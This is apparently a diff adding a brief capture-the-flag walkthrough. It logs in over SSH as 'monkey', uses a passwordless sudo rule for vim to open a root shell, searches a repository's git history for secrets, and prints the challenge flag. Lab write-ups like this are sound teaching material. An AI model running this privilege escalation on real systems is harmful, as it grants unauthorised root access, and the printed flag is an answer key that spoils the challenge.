@@ -1,0 +1,18 @@
+ssh -p (port) monkey@(hostname)
+Enter password: monkey
+
+sudo -l shows:
+User monkey may run the following commands on 494cdcc2122a:
+    (root) NOPASSWD: /usr/bin/vim
+
+sudo /usr/bin/vim -c ':!/bin/bash' /dev/null
+
+cd AuthSec
+
+VIEW PREVIOUS COMMITS:
+----------------------
+git log
+
+git diff 124facc17133688468ca21b57660df33c1f43f70
+
+FLAG: monkeyCTF{5up3r_dup3r_53cr3t_pa55w0rd}
